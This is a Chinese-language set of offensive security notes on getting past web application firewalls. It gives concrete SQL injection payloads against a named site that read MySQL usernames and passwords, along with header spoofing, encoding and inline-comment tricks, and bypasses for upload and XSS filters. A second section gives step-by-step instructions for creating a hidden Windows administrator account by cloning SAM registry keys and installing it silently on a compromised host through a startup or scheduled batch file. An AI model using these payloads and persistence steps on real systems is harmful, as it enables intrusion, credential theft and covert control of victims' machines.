## 绕过方法
1. 伪造UA头,伪装成搜索引擎 ,比如把UA头改为百度爬虫,谷歌爬虫的UA头信息. BP代理工具中可以替换UA头

2. 伪造某些WAF的白名单特殊目录
    - 360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截
    比如：```www.spisec.com/pen/news.php?id=1 union select user,password from mysql.user```  
    可以改为:  
    ```www.spisec.com/pen/news.php/admin?id=1 union select user,password from mysql.user```  
    或者  
    ```www.spisec.com/pen/admin/..\news.php?id=1 union select user,password from mysql.user```
3. 直接攻击源站 如果可以通过C段或者社工找到原始的服务器地址,便可以直接绕过访问原始服务器,绕过waf
4. 修改XFF头,改成本地地址进行绕过,通过BP的BYPASSWAF插件可以在重发器发送包后自动插入.

5. URL编码绕过,现在基本需要和其他混合使用,单独使用没效果
6. 请求方式绕过,默认情况下安全狗等设备是不会对Post模式进行参数检测,如果程序本身允许get和post,那么可以考虑绕过.
7. 复参数绕过```GET /pen/news.php?id=1 union select user,password from mysql.user```  
   可以修改为  
   ```GET pen/news.php?id=1&id=union&id=select&id=user,password&id=from%20mysql.user```
8. 几个可以考虑综合起来的方法
    - 空格替换法 把空格替换成%0a  %0a是换行的url编码 也就是/r
    - 使用大小写
    - 双写替换法
    - 编码和内联注释结合 ```http://www.***.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4```
9. 使用其他变量或者命令对注入语句进行替换
    - COMMAND 替换成 WHAT TO USE INSTEAD
    - @@version 替换成 version()
    - concat() 替换成 concat_ws()
    - group_concat() 替换成 concat_ws()
    - = 替换成 like
    1 替换成 mod(8,7) ```?id=1'or mod(8,7) in (1)#```
10. 组合绕过的几种示例
    - 利用()代替空格 + 利用mysql特性/\*!\*/执行语句 + 利用/\*\*/混淆代码  
    比如```union/*%00*//*!50010select*/(database/**/()),(user/**/())%23```
11. mysql内联样式 允许运行select /!1/; 会执行!后面的语句 还有一种特殊的内联样式 当！后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。 这里的版本为5.6.39,经过测试把第一个.写成0,那么在版本号前面的5位数字只要小于50639的话,!后面的语句就可以被执行 比如```select /*!50000version()*/ 就会执行select version()函数,详情见sql注入的"MYSQL的内联样式详解可以用于过WAF"  
<font color="red">具体内联注释绕过有多重变形,详见突破安全狗.doc文件的内联注释绕过章节.</font>  

12. 异或绕过
在^没有被过滤的时候可以利用它来测试 ,异或：xor或^ 逻辑运算就是：同假异真 ```222' Xor '1'='1' #```

13. 文件上传绕过
    - 等号绕过 在filename后多添加两个等号 
    - 换行绕过 在文件后缀名处换行 
    - 填充垃圾字符 在Content-Disposition字段后添加垃圾数据，来绕过对文件名的校验
    
    
14. XSS绕过
    - 常见的\<script\>会被拦截,所以可以利用不常见的标签 比如\<audio\>\<video\> 还有div,button,math,keygen等
    
    
    
15. post递交方式用分块传输
    

## webshell绕过建立账号

## 原理解析
通过图形界面创建的新账号或者通过net user \/add aa\\$ 是可以在计算机管理界面看到的,但是通过复制已经存在的账户(比如administrator)的注册表信息将会是一个隐藏的用户信息,无法通过命令net user和计算机的管理界面看到.  
另外如果用命令行创建新的账号aa和aa\$,aa只是普通账户,可以通过net user和计算机管理界面看到,而aa\\$账户只能通过管理界面看到,无法通过net user命令看到


## 接下来复制一个管理员账号给一个test\\$账号,这个实验可以先在自己的物理机导出2个账号的注册表信息,然后通过上传注册表文件和批处理文件给肉鸡,通过制定启动或者任务计划让批处理在重启后自动运行,如果对方有管理员权限账号,就会创建一个相同密码相同权限的test\\$账号.
1. 可以看到注册表中2处位置的号码是对应的
    ```计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4```  
    ```计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator```

2. 我们需要把administrator和test$的这2处注册表信息分别导出,  
cmd命令语法 regedit /e filename path  
```regedit /e c:1.reg 计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4```
3. 将注册表中```Users\Names\Administrator``` 导出的文件内容覆盖到 ```Users\Names\test$```
同理将00001F4拷贝到000003E导出的文件内容


4. 拷贝完后,我们获取到的新的test的2个注册表文件写入批处理,使用 regedit /s pth 进行静默导入,不要弹对话框
  
将文件保存为bat模式,放入计划或者启动地方,等待重启后,机器会重复创建一个和管理员相同配置,相同密码的test\\$账号.  
并且中途不会有任何弹窗,因为导出注册表是正常的行为,这样就获取了一个管理员权限但是无法在net user命令和计算机管理界面看到的隐藏账户, 但是在注册表下面依旧是可以看到的.
